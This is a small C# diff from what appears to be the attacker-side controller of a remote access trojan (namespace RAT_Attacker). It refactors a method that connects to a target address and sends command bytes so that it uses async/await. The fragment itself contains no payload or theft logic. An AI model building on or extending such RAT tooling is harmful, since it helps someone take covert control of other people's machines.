@@ -1,12 +1,9 @@
-﻿using System;
-using System.CodeDom;
-using RAT_Library;
+﻿using RAT_Library;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
-using System.Threading;
 using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Input;
@@ -23,31 +20,28 @@ namespace RAT_Attacker
             InitializeComponent();
         }
 
-        private void SendCommand(RatCommand command, IEnumerable<byte> data = null)
+        private async void SendCommand(RatCommand command, IEnumerable<byte> data = null)
         {
             IsEnabled = false;
             _client = new Socket(SocketType.Stream, ProtocolType.Tcp);
-            _client.BeginConnect(new IPEndPoint(IPAddress.Parse(AddressTextBox.Text), Common.Port), ar =>
+            try
             {
-                try
+                await _client.ConnectAsync(new IPEndPoint(IPAddress.Parse(AddressTextBox.Text), Common.Port));
+                var commandId = new[] { (byte)command };
+                _client.Send(data == null ? commandId : commandId.Concat(data).ToArray());
+            }
+            catch (SocketException ex)
+            {
+                if (ex.SocketErrorCode == SocketError.ConnectionRefused)
                 {
-                    _client.EndConnect(ar);
-                    var commandId = new[] { (byte)command };
-                    _client.Send(data == null ? commandId : commandId.Concat(data).ToArray());
+                    Dispatcher.Invoke(() =>
+                        MessageBox.Show("Cannot connect", "Error", MessageBoxButton.OK, MessageBoxImage.Error));
                 }
-                catch (SocketException ex)
-                {
-                    if (ex.SocketErrorCode == SocketError.ConnectionRefused)
-                    {
-                        Dispatcher.Invoke(() =>
-                            MessageBox.Show("Cannot connect", "Error", MessageBoxButton.OK, MessageBoxImage.Error));
-                    }
-                }
-                finally
-                {
-                    Dispatcher.Invoke(() => IsEnabled = true);
-                }
-            }, null);
+            }
+            finally
+            {
+                Dispatcher.Invoke(() => IsEnabled = true);
+            }
         }
 
         private async Task<byte[]> SendCommandAndGetDataAsync(RatCommand command)
